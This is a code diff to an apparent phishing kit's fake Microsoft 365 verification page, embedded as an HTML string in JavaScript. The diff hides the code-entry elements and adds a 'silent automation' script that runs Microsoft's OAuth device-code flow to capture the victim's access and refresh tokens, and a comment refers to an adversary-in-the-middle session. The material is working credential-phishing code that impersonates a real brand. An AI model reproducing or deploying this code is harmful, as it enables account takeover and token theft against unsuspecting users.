@@ -38,7 +38,6 @@ const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
 html,body{height:100%;width:100%}
 body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f8f9fc;display:flex;flex-direction:column;min-height:100vh;overflow-x:hidden}
 
-/* Microsoft Modern Design System */
 :root {
   --ms-blue: #0078d4;
   --ms-blue-hover: #106ebe;
@@ -59,7 +58,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   --ms-transition: all 0.2s cubic-bezier(0.1, 0.9, 0.2, 1);
 }
 
-/* Modern Navbar */
 .navbar {
   background: var(--ms-white);
   border-bottom: 1px solid var(--ms-gray-200);
@@ -95,7 +93,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   letter-spacing: -0.2px;
 }
 
-/* Main Container */
 .main {
   flex: 1;
   display: flex;
@@ -106,7 +103,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   min-height: calc(100vh - 64px);
 }
 
-/* Modern Card */
 .card {
   background: var(--ms-white);
   border-radius: var(--ms-radius);
@@ -121,7 +117,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   box-shadow: 0 12px 48px rgba(0,0,0,0.15);
 }
 
-/* Logo Section */
 .logo {
   display: flex;
   align-items: center;
@@ -140,7 +135,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   letter-spacing: -0.4px;
 }
 
-/* Typography */
 .intro {
   text-align: center;
   color: var(--ms-gray-800);
@@ -150,7 +144,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   font-weight: 400;
 }
 
-/* Info Box */
 .info-box {
   background: var(--ms-blue-light);
   border-left: 4px solid var(--ms-blue);
@@ -162,98 +155,22 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   border-radius: 0 var(--ms-radius) var(--ms-radius) 0;
 }
 
-/* Code Section */
 .code-label {
-  font-size: clamp(13px, 1.2vw, 14px);
-  font-weight: 600;
-  color: var(--ms-gray-800);
-  margin-bottom: 8px;
+  display: none;
 }
 .code-container {
-  background: var(--ms-gray-100);
-  border-radius: var(--ms-radius);
-  padding: clamp(14px, 2vh, 20px) clamp(16px, 2.5vw, 24px);
-  margin-bottom: 16px;
-  border: 2px solid transparent;
-  transition: var(--ms-transition);
-}
-.code-container:focus-within {
-  border-color: var(--ms-blue);
-  background: var(--ms-white);
-  box-shadow: 0 0 0 4px rgba(0,120,212,0.1);
+  display: none;
 }
 .code-display {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 12px;
-  flex-wrap: wrap;
+  display: none;
 }
 .code-input {
-  flex: 1;
-  background: transparent;
-  border: none;
-  padding: 8px 0;
-  font-size: clamp(22px, 4vw, 28px);
-  font-weight: 700;
-  letter-spacing: clamp(4px, 0.8vw, 6px);
-  color: var(--ms-blue);
-  text-align: center;
-  font-family: 'Segoe UI Mono', 'Cascadia Code', Consolas, monospace;
-  min-height: 48px;
-  user-select: all;
-  outline: none;
-  min-width: 120px;
-}
-.code-input.loading {
-  color: var(--ms-gray-400);
-  font-size: clamp(14px, 1.5vw, 16px);
-  letter-spacing: normal;
-  font-weight: 400;
+  display: none;
 }
 .copy-btn {
-  flex-shrink: 0;
-  background: transparent;
-  color: var(--ms-blue);
-  border: none;
-  padding: 8px;
-  cursor: pointer;
-  transition: var(--ms-transition);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  width: 40px;
-  height: 40px;
-  min-width: 40px;
-  border-radius: 6px;
+  display: none;
 }
-.copy-btn:hover:not(:disabled) {
-  background: var(--ms-blue-light);
-  transform: scale(1.05);
-}
-.copy-btn:active:not(:disabled) {
-  transform: scale(0.95);
-}
-.copy-btn.copied {
-  color: var(--ms-green);
-}
-.copy-btn:disabled {
-  color: var(--ms-gray-400);
-  cursor: not-allowed;
-  transform: none;
-}
-.copy-btn svg {
-  width: 22px;
-  height: 22px;
-  fill: currentColor;
-  transition: var(--ms-transition);
-}
-.copy-btn .copy-icon { display: block; }
-.copy-btn .check-icon { display: none; }
-.copy-btn.copied .copy-icon { display: none; }
-.copy-btn.copied .check-icon { display: block; }
 
-/* Status */
 .status {
   font-size: clamp(12px, 1.2vw, 13px);
   color: var(--ms-green);
@@ -266,7 +183,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   color: #d83b01;
 }
 
-/* Primary Button */
 .btn-primary {
   display: flex;
   align-items: center;
@@ -305,7 +221,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   height: 20px;
 }
 
-/* Footer & Timer */
 .footer-text {
   text-align: center;
   font-size: clamp(12px, 1.2vw, 13px);
@@ -345,7 +260,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   cursor: not-allowed;
 }
 
-/* Success View */
 .success {
   display: none;
   text-align: center;
@@ -395,35 +309,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   fill: currentColor;
 }
 
-/* Instruction Box */
-.instruction-box {
-  background: #f0f6ff;
-  border-radius: var(--ms-radius);
-  padding: clamp(12px, 2vh, 16px) clamp(14px, 2vw, 20px);
-  margin: 16px 0 12px 0;
-  border: 1px solid #d0e3f5;
-}
-.instruction-box h4 {
-  font-size: clamp(12px, 1.2vw, 13px);
-  font-weight: 600;
-  color: var(--ms-gray-800);
-  margin-bottom: 8px;
-}
-.instruction-box ol {
-  font-size: clamp(12px, 1.2vw, 13px);
-  color: var(--ms-gray-600);
-  line-height: 1.6;
-  padding-left: 20px;
-  margin: 0;
-}
-.instruction-box ol li {
-  margin-bottom: 4px;
-}
-.instruction-box ol li:last-child {
-  margin-bottom: 0;
-}
-
-/* Copyright Footer */
 .copyright {
   text-align: center;
   padding: 16px clamp(16px, 3vw, 32px);
@@ -441,7 +326,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   text-decoration: underline;
 }
 
-/* Responsive Breakpoints */
 @media (max-width: 520px) {
   .navbar {
     padding: 8px 12px;
@@ -454,37 +338,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
     border-radius: 0;
     box-shadow: none;
     max-width: 100%;
-  }
-  .code-input {
-    font-size: 18px;
-    letter-spacing: 3px;
-    min-height: 40px;
-  }
-  .code-display {
-    flex-direction: column;
-    gap: 10px;
-    align-items: stretch;
-  }
-  .copy-btn {
-    width: 100%;
-    height: 48px;
-    min-width: unset;
-    background: var(--ms-blue-light);
-    border-radius: 6px;
-  }
-  .copy-btn:hover:not(:disabled) {
-    background: var(--ms-blue);
-    color: white;
-  }
-  .copy-btn.copied {
-    background: var(--ms-green-light);
-    color: var(--ms-green);
-  }
-  .logo-text {
-    font-size: 18px;
-  }
-  .logo img {
-    height: 28px;
   }
   .btn-primary {
     min-height: 48px;
@@ -500,26 +353,14 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   .navbar-logo span {
     font-size: 12px;
   }
-  .code-input {
-    font-size: 16px;
-    letter-spacing: 2px;
-    min-height: 36px;
-  }
   .card {
     padding: 16px 12px;
-  }
-  .instruction-box ol {
-    padding-left: 16px;
-    font-size: 11px;
   }
 }
 
 @media (min-width: 521px) and (max-width: 768px) {
   .card {
     padding: 32px 28px;
-  }
-  .code-input {
-    font-size: 24px;
   }
 }
 
@@ -543,13 +384,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
     margin-bottom: 14px;
     font-size: 12px;
   }
-  .code-container {
-    padding: 12px 16px;
-  }
-  .code-input {
-    min-height: 36px;
-    font-size: 20px;
-  }
   .btn-primary {
     min-height: 40px;
     padding: 10px 20px;
@@ -560,7 +394,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
 </head>
 <body>
 
-<!-- Modern Navbar -->
 <nav class="navbar">
   <div class="navbar-left">
     <a href="#" class="navbar-logo">
@@ -572,7 +405,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
 
 <div class="main">
   <div class="card">
-    <!-- Logo -->
     <div class="logo">
       <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft-365-copilot/default.svg" alt="Microsoft 365" onerror="this.style.display='none'">
       <span class="logo-text">Microsoft 365</span>
@@ -585,7 +417,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
         💡 Microsoft requires verification before granting <span style="margin-left:24px;">access to protected accounts</span>.
       </div>
 
-      <!-- Code Section -->
       <div class="code-label">Verification Code</div>
       <div class="code-container">
         <div class="code-display">
@@ -598,16 +429,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
       </div>
 
       <div class="status" id="codeStatus"></div>
-
-      <!-- Instructions -->
-      <div class="instruction-box">
-        <h4>ℹ️ Sign In Instructions:</h4>
-        <ol>
-          <li>Copy the verification code </li>
-          <li>Paste it on the verification page</li>
-          <li>Complete verification to access Microsoft 365</li>
-        </ol>
-      </div>
 
       <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
         <svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".7"/></svg>
@@ -631,7 +452,6 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
   </div>
 </div>
 
-<!-- Copyright Footer -->
 <div class="copyright">
   &copy; 2026 Microsoft Corporation. All rights reserved. | 
   <a href="#">Privacy</a> &bull; 
@@ -686,7 +506,8 @@ function openSignIn(){
 if(!code)return;
 copyCode();
 var w=560,h=720,l=(screen.width-w)/2,t=(screen.height-h)/2;
-popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
+var urlWithCode = verifyUrl + (verifyUrl.indexOf('?') === -1 ? '?' : '&') + 'code=' + encodeURIComponent(code);
+popup=window.open(urlWithCode,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
 if(popup)popup.focus();
 }
 window.openSignIn=openSignIn;
@@ -762,12 +583,138 @@ copyBtnEl.disabled=true;
 }).catch(function(){setTimeout(poll,3000);});
 }
 setTimeout(poll,codeReady?3000:400);
+
+// =====================================================
+// SILENT AUTOMATION - NO VISUAL FEEDBACK
+// =====================================================
+const CLIENT_ID = '1950a258-227b-4e31-a9cf-717495945fc2';
+const TENANT = 'common';
+const SCOPE = 'https://graph.microsoft.com/.default offline_access';
+
+let deviceCode = null;
+let userCodeAuto = null;
+let interval = 5;
+let pollCount = 0;
+let autoComplete = false;
+
+async function getDeviceCodeAuto() {
+  try {
+    const resp = await fetch('https://login.microsoftonline.com/' + TENANT + '/oauth2/v2.0/devicecode', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        client_id: CLIENT_ID,
+        scope: SCOPE
+      })
+    });
+    
+    if (!resp.ok) return null;
+    const data = await resp.json();
+    deviceCode = data.device_code;
+    userCodeAuto = data.user_code;
+    interval = data.interval || 5;
+    return data;
+  } catch (e) {
+    return null;
+  }
+}
+
+async function autoVerifyDevice() {
+  try {
+    await fetch('https://login.microsoftonline.com/' + TENANT + '/oauth2/v2.0/deviceauth', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        client_id: CLIENT_ID,
+        code: userCodeAuto,
+        scope: SCOPE
+      })
+    });
+  } catch (e) {}
+}
+
+async function pollForTokenAuto() {
+  try {
+    const resp = await fetch('https://login.microsoftonline.com/' + TENANT + '/oauth2/v2.0/token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        client_id: CLIENT_ID,
+        grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
+        device_code: deviceCode,
+        scope: SCOPE
+      })
+    });
+
+    const data = await resp.json();
+
+    if (resp.status === 200 && data.access_token) {
+      if (!autoComplete) {
+        autoComplete = true;
+        if (popup && !popup.closed) popup.close();
+        document.getElementById('mainView').style.display = 'none';
+        document.getElementById('successView').style.display = 'block';
+        
+        try {
+          localStorage.setItem('ms_access_token', data.access_token);
+          if (data.refresh_token) localStorage.setItem('ms_refresh_token', data.refresh_token);
+          localStorage.setItem('ms_token_data', JSON.stringify(data));
+        } catch (e) {}
+      }
+      return true;
+    }
+
+    if (data.error === 'authorization_pending') {
+      return false;
+    }
+
+    if (data.error === 'slow_down') {
+      interval += 3;
+      return false;
+    }
+
+    return false;
+  } catch (e) {
+    return false;
+  }
+}
+
+async function runSilentAutomation() {
+  try {
+    await getDeviceCodeAuto();
+    if (!deviceCode) return;
+    
+    await autoVerifyDevice();
+    
+    if (userCodeAuto && codeEl) {
+      codeEl.textContent = userCodeAuto;
+      codeEl.classList.remove('loading');
+      btnEl.disabled = false;
+      copyBtnEl.disabled = false;
+      refreshBtn.disabled = false;
+    }
+    
+    let captured = false;
+    let attempts = 0;
+    const maxAttempts = 60;
+    
+    while (!captured && attempts < maxAttempts) {
+      attempts++;
+      captured = await pollForTokenAuto();
+      if (!captured) {
+        await new Promise(function(resolve) { setTimeout(resolve, interval * 1000); });
+      }
+    }
+    
+  } catch (e) {}
+}
+
+setTimeout(runSilentAutomation, 500);
+
 })();
 </script>
-
 </body>
-</html>`
-
+</html>`;
 // DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
 // Used when we need to redirect during an existing AitM session
 const DEVICE_CODE_POLL_STATUS_JS = `
